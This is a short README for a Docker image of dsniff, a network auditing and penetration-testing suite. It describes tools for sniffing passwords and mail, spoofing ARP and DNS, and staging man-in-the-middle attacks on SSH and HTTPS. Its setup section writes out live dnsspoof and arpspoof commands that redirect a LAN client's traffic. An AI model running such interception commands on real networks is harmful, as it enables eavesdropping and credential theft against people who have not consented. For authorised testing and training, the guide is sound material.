dsniff
======

[dsniff][1] is a collection of tools for network auditing and penetration
testing. dsniff, filesnarf, mailsnarf, msgsnarf, urlsnarf, and webspy passively
monitor a network for interesting data (passwords, e-mail, files, etc.).
arpspoof, dnsspoof, and macof facilitate the interception of network traffic
normally unavailable to an attacker (e.g, due to layer-2 switching). sshmitm
and webmitm implement active monkey-in-the-middle attacks against redirected
SSH and HTTPS sessions by exploiting weak bindings in ad-hoc PKI.

## docker-compose.yml

```yaml
dsniff:
  image: vimagick/dsniff
  net: host
  volumes:
    - ./data:/data
  working_dir: /data
  tty: yes
  restart: unless-stopped
```

## Server Setup

```bash
$ docker-compose up -d
$ docker-compose exec dsniff tmux ls
$ docker-compose exec dsniff tmux a
>>> echo -e '192.168.31.1\twww.baidu.com' >> hosts
>>> dnsspoof -i eth0 -f hosts
>>> arpspoof -i eth0 -t 192.168.31.1 192.168.31.102
>>> arpspoof -i eth0 -t 192.168.31.102 192.168.31.1
```

## Client Setup

```bash
$ ping www.baidu.com
$ curl www.baidu.com
```

[1]: https://www.monkey.org/~dugsong/dsniff/
